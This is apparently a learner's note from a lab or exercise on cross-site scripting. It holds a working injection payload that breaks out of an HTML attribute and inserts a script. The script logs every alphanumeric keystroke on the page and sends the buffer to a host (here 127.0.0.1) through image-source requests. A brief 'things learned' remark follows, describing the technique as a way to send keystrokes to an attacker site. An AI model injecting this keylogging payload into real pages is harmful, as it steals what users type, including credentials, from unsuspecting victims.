"><script>document.addEventListener('DOMContentLoaded', () => {'use strict';let buffer = [];document.addEventListener('keydown', event => {const charList = 'abcdefghijklmnopqrstuvwxyz0123456789';const key = event.key.toLowerCase();if (charList.indexOf(key) === -1) return;buffer.push(key);console.log(buffer);var i = document.createElement("img"); i.src = "http://127.0.0.1/?"+buffer;});});</script>


things learned,

we can take keystrokes from a inputbox and send it to attacker site a webrequests created using img src tags


